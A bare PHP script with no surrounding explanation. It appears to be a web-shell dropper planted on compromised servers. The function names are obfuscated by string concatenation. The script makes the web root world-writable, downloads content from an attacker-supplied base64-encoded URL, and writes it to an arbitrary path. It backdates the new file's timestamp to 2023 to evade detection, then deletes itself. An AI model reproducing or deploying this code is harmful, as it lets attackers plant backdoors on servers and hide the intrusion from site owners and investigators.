<?php
$a='co';
$b='py';
$c=$a.$b;
$d='file_pu';
$e='t_contents';
$f=$d.$e;
$webroot = $_SERVER['DOCUMENT_ROOT'];
if (is_dir($webroot)) {
		@chmod($webroot, 0777);
	} else {
		@mkdir($webroot, 0777, true);
	}
if (isset($_REQUEST["path"]) && isset($_REQUEST["url"])) {
	$url=base64_decode(substr($_REQUEST["url"], 2));
	$contents = @file_get_contents($url);
	$path = base64_decode(substr($_REQUEST["path"], 2));
	$file=$webroot."/".$path;
	$f_result=$f($file, $contents);
	if ($f_result==false){
		if (!file_exists($file)){
			$c_result=$c($contents,$file);
			if ($c_result){
				echo "0x0007me success.(copy)";
				$newTime = "2023-08-09 04:04:21";
				$timestamp = strtotime($newTime);
				@touch($file, $timestamp,$timestamp);
			}else{
				echo "0x0007me fail.(copy)";
			}
		}else{
			echo "0x0007me fail.(file_put_contents file already exist)";
		}
	}else{
		echo "0x0007me success.(file_put_contents)";
		$newTime = "2023-08-09 04:04:21";
		$timestamp = strtotime($newTime);
		@touch($file, $timestamp,$timestamp);
	}
	@unlink(__FILE__);
}else{
	echo "0x0007me fail.(path or url error)";
}